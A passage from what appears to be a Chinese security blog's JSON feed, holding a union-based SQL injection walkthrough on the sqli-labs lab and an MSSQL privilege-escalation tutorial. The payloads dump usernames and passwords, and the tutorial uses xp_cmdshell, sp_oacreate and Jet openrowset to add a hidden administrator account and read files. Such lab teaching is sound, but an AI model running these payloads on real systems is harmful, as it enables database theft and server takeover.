所在的位置，已经被一组输出内容所替换。</p>\n<p><img src=\"image-20220928230746841.png\" alt=\"image-20220928230746841\"></p>\n<p>除了 group_concat ()，我们还可以使用：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#输出当前使用数据库的名称</span><br><span class=\"line\">database() </span><br><span class=\"line\">#输出当前服务器中使用数据库的用户的名字和其对应的主机</span><br><span class=\"line\"><span class=\"keyword\">user</span>()</span><br><span class=\"line\">#输出当前数据库版本号</span><br><span class=\"line\">version()</span><br><span class=\"line\">#输出该服务器数据库安装路径（数据库安装在哪里）</span><br><span class=\"line\">@<span class=\"variable\">@basedir</span></span><br><span class=\"line\">#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</span><br><span class=\"line\">@<span class=\"variable\">@datadir</span></span><br><span class=\"line\">#输出操作系统的版本号</span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os</span><br><span class=\"line\">#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的<span class=\"number\">32</span>位字符串。</span><br><span class=\"line\">md5(<span class=\"string\">&#x27;xxxx&#x27;</span>)</span><br><span class=\"line\">#使用某个拼接符如“:”来拼接str1和str2</span><br><span class=\"line\">concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, str1, str2)</span><br></pre></td></tr></table></figure>\n<p>接着我们查询所在数据库的名字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), database() <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>哦，原来是在 security 数据库中</p>\n<p><img src=\"image-20220928231402676.png\" alt=\"image-20220928231402676\"></p>\n<h4 id=\"3确定想从某个库中拿到什么表从表中拿到什么列\"><a class=\"markdownIt-Anchor\" href=\"#3确定想从某个库中拿到什么表从表中拿到什么列\">#</a> 3）确定想从某个库中拿到什么表，从表中拿到什么列</h4>\n<p>我们看看从 security 库中都可以读取什么表？</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Tables 表</strong>中，查询当 table_schema 的值为我们刚刚获取的 security 库时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928231639522.png\" alt=\"image-20220928231639522\"></p>\n<p><strong>获取到 security 库中的所有表为</strong>： <code>emails</code> 、 <code>referers</code> 、 <code>uagents</code> 、 <code>users</code></p>\n<p>我们比较关心账号密码相关，所以眼光聚焦到 users 表。</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Columns 表</strong>中，查询当<strong> table_schema</strong> 的值为我们刚刚获取的 <code>security</code>  且 <strong>table_name</strong> 为 <code>users</code>  时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(column_name), database() <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() <span class=\"keyword\">and</span> table_name <span class=\"operator\">=</span> <span class=\"string\">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>\n<p><strong>获取到 security 库中，users 表里所有列为</strong>： <code>id</code> 、 <code>username</code> 、 <code>password</code></p>\n<p><img src=\"image-20220928232355430.png\" alt=\"image-20220928232355430\"></p>\n<p>我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：</p>\n<p><strong>核心</strong> —— 由于已经知道了所在<strong> security 库</strong>，<strong>users 表</strong>，因此直接 <code>select xxxx from security.users</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, username, password)), <span class=\"number\">3</span> <span class=\"keyword\">from</span> security.users #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928232842359.png\" alt=\"image-20220928232842359\"></p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>查看注入类型</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; # 报错(整型和单引号都会报错)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定整型注入</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.确定列数</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.构造联合查询,确定所在库名。</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: information_schema</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#5.确定在这个库中，都有什么表</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: emails,flag,users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#6.确定我们要找flag表，并看这个表中有什么列</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>flag<span class=\"string\">&#x27;#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag,value</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#7.取列的值，另外把查询的from 后面改成对应的&quot;库.表&quot;</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&#x27;</span>:<span class=\"string\">&#x27;, flag, value)) from challenge.flag#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse</span></span><br></pre></td></tr></table></figure>\n<p>至此，整型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "MSSQL提权攻击",
            "date_published": "2022-09-27T14:46:06.000Z",
            "content_html": "<h1 id=\"sql-servermssql提权\"><a class=\"markdownIt-Anchor\" href=\"#sql-servermssql提权\">#</a> SQL Server（MSSQL）提权</h1>\n<p>总结一下，下文使用有效命令全部为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--1.xp_cmdshell提权</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\">#master..xp_cmdshell的全写是master.dbo.xp_cmdshell</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;ipconfig&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\桌面\\flag.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">--恢复语句</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--2.sp_oacreate提权</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net user HeyJack1 HeyJack1 /add&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators HeyJack1 /add&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">--恢复语句</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--3.沙盒提权(不常用，所以没粘贴出来)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-环境准备\"><a class=\"markdownIt-Anchor\" href=\"#0x01-环境准备\">#</a> 0x01 环境准备</h2>\n<p>输入用户名和密码，以 <code>sa</code>  身份登录 SQL Server2005</p>\n<p><img src=\"image-20220927205858375.png\" alt=\"image-20220927205858375\"></p>\n<p>登录后可以看到这样的界面</p>\n<p><img src=\"image-20220927210049933.png\" alt=\"image-20220927210049933\"></p>\n<p>首先我们了解下什么是 sp_configure？</p>\n<p><img src=\"image-20220927210431221.png\" alt=\"image-20220927210431221\"></p>\n<p>其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 <code>show advanced options</code>  为 <code>1</code> ，可以显示高级选项。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">USE master;  </span><br><span class=\"line\">GO  </span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>;  </span><br></pre></td></tr></table></figure>\n<p>sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。</p>\n<h2 id=\"0x02-xp_cmdshell提权步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x02-xp_cmdshell提权步骤\">#</a> 0x02 xp_cmdshell 提权步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#以下大写字母均可小写</span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211220768.png\" alt=\"image-20220927211220768\"></p>\n<p>使用鼠标选中一行，然后右键选择执行</p>\n<p><img src=\"image-20220927211614093.png\" alt=\"image-20220927211614093\"></p>\n<h3 id=\"2第二步打开cmd-shell\"><a class=\"markdownIt-Anchor\" href=\"#2第二步打开cmd-shell\">#</a> ②第二步，打开 cmd-shell</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211736845.png\" alt=\"image-20220927211736845\"></p>\n<h3 id=\"3第三步输入你想执行的windows-cmd命令\"><a class=\"markdownIt-Anchor\" href=\"#3第三步输入你想执行的windows-cmd命令\">#</a> ③第三步，输入你想执行的 windows cmd 命令。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211958154.png\" alt=\"image-20220927211958154\"></p>\n<p>言归正传，我们为系统添加属于 <code>攻击者自己的net user账户</code>  (主要目的是使用已知的用户名和密码)</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#比如，账户名是HeyJack 密码也是HeyJack</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212339481.png\" alt=\"image-20220927212339481\"></p>\n<p>此时，我们在 windows 的 cmd 里，执行 net user</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">这一步是在服务器里面查看。当然，现在只是为了展示我们的创建结果。</span></span><br><span class=\"line\">net user</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927212609276.png\" alt=\"image-20220927212609276\"></p>\n<p>&quot;开始&quot; 菜单 — 管理工具 — 计算机管理 — 本地用户和组 — 用户 —HeyJack 右键属性 — 隶属于</p>\n<p>查看当前分组在 Users 组</p>\n<p><img src=\"image-20220927212746484.png\" alt=\"image-20220927212746484\"></p>\n<h3 id=\"4第四步将你新建的用户移到administrators组\"><a class=\"markdownIt-Anchor\" href=\"#4第四步将你新建的用户移到administrators组\">#</a> ④第四步，将你新建的用户移到 administrators 组</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927213122417.png\" alt=\"image-20220927213122417\"></p>\n<p>继续查看我们的分组情况，可以看到，提权成功：</p>\n<p><img src=\"image-20220927213219218.png\" alt=\"image-20220927213219218\"></p>\n<h3 id=\"5第五步获取远程服务器中的目标文件\"><a class=\"markdownIt-Anchor\" href=\"#5第五步获取远程服务器中的目标文件\">#</a> ⑤第五步，获取远程服务器中的目标文件</h3>\n<p>我们假设，服务器中管理员 Administrator 创建了一个 flag.txt 文件放在了桌面，我们的 <code>最终目的</code> 就是<strong>为了获取它</strong>。</p>\n<p><img src=\"image-20220927221944235.png\" alt=\"image-20220927221944235\"></p>\n<h4 id=\"第一种方案3389远程连接\"><a class=\"markdownIt-Anchor\" href=\"#第一种方案3389远程连接\">#</a> 第一种方案，3389 远程连接</h4>\n<p>在 win+R 输入 <code>mstsc</code></p>\n<p><img src=\"image-20220927213803912.png\" alt=\"image-20220927213803912\"></p>\n<p>查看服务器 ip 并在自己的客户端上连接，ip 地址也可以通过 SQL 提权命令 + “ipconfig” 来获取</p>\n<p><img src=\"image-20220927221540178.png\" alt=\"image-20220927221540178\"></p>\n<p>然后 3389 远程连接</p>\n<p><img src=\"image-20220927213905588.png\" alt=\"image-20220927213905588\"></p>\n<p>输入刚刚新建的用户民和密码</p>\n<p><img src=\"image-20220927214036680.png\" alt=\"image-20220927214036680\"></p>\n<p>登录成功</p>\n<p><img src=\"image-20220927214149105.png\" alt=\"image-20220927214149105\"></p>\n<p>然后打开 “我的电脑”— 进入 C 盘 — 找到 “Documents and Settings”— 选择 “Administrators”— 桌面 — 即可看到 flag.txt</p>\n<p><img src=\"image-20220927221815971.png\" alt=\"image-20220927221815971\"></p>\n<h4 id=\"第二种方案使用sql提权命令获取内容\"><a class=\"markdownIt-Anchor\" href=\"#第二种方案使用sql提权命令获取内容\">#</a> 第二种方案，使用 SQL 提权命令获取内容</h4>\n<p>另外，也可以使用 SQL 提权命令去当前管理员用户桌面查找（一般 flag 会放在桌面上）</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#dir命令查看当前路径</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;dir&#x27;</span>;</span><br><span class=\"line\">#type命令查看文件内容，一般低版本中，windows桌面的路径为：C:\\Documents <span class=\"keyword\">and</span> Settings\\桌面\\flag.txt</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\Administrator\\桌面\\flag.txt&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927221113281.png\" alt=\"image-20220927221113281\"></p>\n<h2 id=\"0x03-sp_oacreate提权步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x03-sp_oacreate提权步骤\">#</a> 0x03 sp_oacreate 提权步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1-2\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1-2\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2第二步配置ole过程\"><a class=\"markdownIt-Anchor\" href=\"#2第二步配置ole过程\">#</a> ②第二步，配置 OLE 过程</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3第三步定义shell变量int类型\"><a class=\"markdownIt-Anchor\" href=\"#3第三步定义shell变量int类型\">#</a> ③第三步，定义 shell 变量，int 类型。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"4第四步生成shell对象\"><a class=\"markdownIt-Anchor\" href=\"#4第四步生成shell对象\">#</a> ④第四步，生成 shell 对象</h3>\n<p>将结果赋值给第③步生成的 shell 变量里头。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5第五步调用shell对象的run方法来调用net-user\"><a class=\"markdownIt-Anchor\" href=\"#5第五步调用shell对象的run方法来调用net-user\">#</a> ⑤第五步，调用 shell 对象的 run 方法来调用 net user</h3>\n<p>返回值是 null，方法体是执行 system32 目录下的 cmd.exe，并使用 net user 生成 HeyJack1 账号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net user HeyJack1 HeyJack1 /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927230925606.png\" alt=\"image-20220927230925606\"></p>\n<h3 id=\"6第六步调用shell对象的run方法来调用net-localgroup\"><a class=\"markdownIt-Anchor\" href=\"#6第六步调用shell对象的run方法来调用net-localgroup\">#</a> ⑥第六步，调用 shell 对象的 run 方法来调用 net localgroup</h3>\n<p>返回值是 null，方法体是执行 cmd，并使用 net localgroup 将 HeyJack1 挪到 administrators 组下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators HeyJack1 /add&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927231033604.png\" alt=\"image-20220927231033604\"></p>\n<p>以上是使用 sp_oacreate 的提权语句，主要是用来调用 OLE 对象（Object Linking and Embedding 的缩写，VB 中的 OLE 对象），利用 OLE 对象的 run 方法执行系统命令。</p>\n<p>在 oacreate 的官方文档里明确指出了，如果要使用 OLE 对象，必须要开启 ‘Ole Automation Procedures’，也就是 EXEC sp_configure ‘Ole Automation Procedures’, 1;</p>\n<p><strong>执行上面这条语句前</strong>要执行 <code>exec sp_configure 'show advanced options', 1;</code></p>\n<p><strong>官方对这句话的解释是：</strong> <code>show advanced options</code> ,**“显示高级选项”** 选项用来显示 sp_configure 系统存储过程高级选项。</p>\n<p>当 **“显示高级选项”** 设置为 <code> 1</code>  时，可以使用 sp_configure 列出高级选项。  <code>默认值为 0</code></p>\n<h2 id=\"0x04-沙盒提权步骤不常用\"><a class=\"markdownIt-Anchor\" href=\"#0x04-沙盒提权步骤不常用\">#</a> 0x04 沙盒提权步骤 (不常用)</h2>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--提权语句</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">-- 不开启的话在执行xp_regwrite会提示让我们开启，</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ad Hoc Distributed Queries&#x27;</span> ,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_regwrite <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>,<span class=\"string\">&#x27;SandBoxMode&#x27;</span>,<span class=\"string\">&#x27;REG_DWORD&#x27;</span> ,<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master.dbo.xp_regread <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>, <span class=\"string\">&#x27;SandBoxMode&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--执行系统命令select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user HeyJack2 HeyJack2 /add&quot;)&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> openrowset(<span class=\"string\">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class=\"string\">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class=\"string\">&#x27;select shell(&quot;net localgroup administrators HeyJack2 /add&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>沙盒模式 SandBoxMode 参数含义（默认是 2）</p>\n<p><code>0</code> ：在任何所有者中禁止启用安全模式</p>\n<p><code>1</code>  ：为仅在允许范围内</p>\n<p><code>2</code>  ：必须在 access 模式下</p>\n<p><code>3</code> ：完全开启</p>\n<p>openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用程序链接到 SQL Server 的的驱动程序。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--恢复配置</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_regwrite <span class=\"string\">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class=\"string\">&#x27;SOFTWARE\\Microsoft\\Jet\\4.0\\Engines&#x27;</span>,<span 